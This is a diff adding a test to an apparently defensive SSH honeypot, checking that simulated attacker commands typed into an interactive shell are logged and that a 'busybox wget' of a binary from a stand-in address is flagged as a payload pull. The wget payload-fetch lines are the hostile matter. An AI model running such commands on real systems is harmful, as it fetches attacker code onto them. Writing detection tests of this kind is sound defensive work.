@@ -162,3 +162,38 @@ def test_ssh_shell_captures_commands_and_payload_pull(tmp_path):
     assert pull[0]["request"]["tool"] == "wget"
     assert pull[0]["request"]["url"] == "http://10.0.0.9/x.sh"
     assert pull[0]["service"] == "ssh"
+
+
+def test_ssh_interactive_shell_captures_commands(tmp_path):
+    # Exercises the process.command-is-None interactive branch (prompt, stdin
+    # loop, exit handling) — the primary honeypot path (attacker types commands).
+    log = tmp_path / "e.jsonl"
+    sink = EventSink(session="t", log_path=log, echo=False)
+    svc = SshService(cfg={"port": 0, "accept_after": 1, "bruteforce_threshold": 99},
+                     sink=sink, bind_address="127.0.0.1", data_dir=tmp_path, tls={})
+
+    async def scenario():
+        await svc.start()
+        port = svc._server.get_port()
+        async with asyncssh.connect("127.0.0.1", port, username="root",
+                                    known_hosts=None,
+                                    client_factory=_client(["root"])) as conn:
+            proc = await conn.create_process()          # no command => interactive
+            proc.stdin.write("whoami\n")
+            proc.stdin.write("busybox wget http://10.0.0.9/m.bin\n")
+            proc.stdin.write("exit\n")
+            await proc.stdin.drain()
+            out = await asyncio.wait_for(proc.stdout.read(), timeout=5)
+            await proc.wait_closed()
+            assert "root" in out                        # canned whoami output
+        await svc.stop()
+
+    asyncio.run(scenario())
+    sink.close()
+    events = _wait_for_events(log)
+    cmds = [e for e in events if e.get("request", {}).get("command")]
+    assert any(e["request"]["command"] == "whoami" for e in cmds)
+    pull = [e for e in events if "ssh-payload-pull" in e.get("tags", [])]
+    assert pull, "no ssh-payload-pull signal from interactive shell"
+    assert pull[0]["request"]["tool"] == "wget"         # busybox wrapper stripped
+    assert pull[0]["request"]["url"] == "http://10.0.0.9/m.bin"
